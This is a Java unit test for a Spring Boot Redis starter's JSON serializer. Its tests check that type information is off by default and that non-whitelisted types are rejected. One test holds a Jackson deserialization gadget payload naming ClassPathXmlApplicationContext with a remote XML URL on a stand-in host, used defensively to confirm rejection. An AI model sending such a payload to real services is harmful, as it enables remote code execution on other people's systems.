package com.sloth.boot.starter.redis.config;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.data.redis.serializer.GenericJackson2JsonRedisSerializer;

import java.nio.charset.StandardCharsets;
import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * Redis 序列化配置测试。
 */
@DisplayName("RedisSerializerConfig 测试")
class RedisSerializerConfigTest {

    private final RedisSerializerConfig config = new RedisSerializerConfig();

    @Test
    @DisplayName("默认关闭类型信息")
    void typeInfoDisabledByDefault() {
        RedisProperties redisProperties = new RedisProperties();
        assertThat(redisProperties.isEnableTypeInfo()).isFalse();

        GenericJackson2JsonRedisSerializer serializer = config.genericJackson2JsonRedisSerializer(redisProperties);
        byte[] bytes = serializer.serialize(List.of("a", "b"));

        assertThat(new String(bytes, StandardCharsets.UTF_8)).doesNotContain("@class");
    }

    @Test
    @DisplayName("开启类型信息时正常序列化白名单类型")
    void typeInfoEnabledSerializesWhitelistedType() {
        RedisProperties redisProperties = new RedisProperties();
        redisProperties.setEnableTypeInfo(true);

        GenericJackson2JsonRedisSerializer serializer = config.genericJackson2JsonRedisSerializer(redisProperties);
        byte[] bytes = serializer.serialize(new java.util.ArrayList<>(List.of("a", "b")));

        assertThat(new String(bytes, StandardCharsets.UTF_8)).contains("java.util.");
    }

    @Test
    @DisplayName("开启类型信息时拒绝白名单外的危险类型")
    void typeInfoEnabledRejectsNonWhitelistedType() {
        RedisProperties redisProperties = new RedisProperties();
        redisProperties.setEnableTypeInfo(true);

        GenericJackson2JsonRedisSerializer serializer = config.genericJackson2JsonRedisSerializer(redisProperties);
        String maliciousJson = "[\"org.springframework.context.support.ClassPathXmlApplicationContext\","
            + "{\"x\":\"http://evil.example/poc.xml\"}]";
        byte[] malicious = maliciousJson.getBytes(StandardCharsets.UTF_8);

        assertThatThrownBy(() -> serializer.deserialize(malicious, Object.class))
            .isInstanceOf(RuntimeException.class);
    }
}
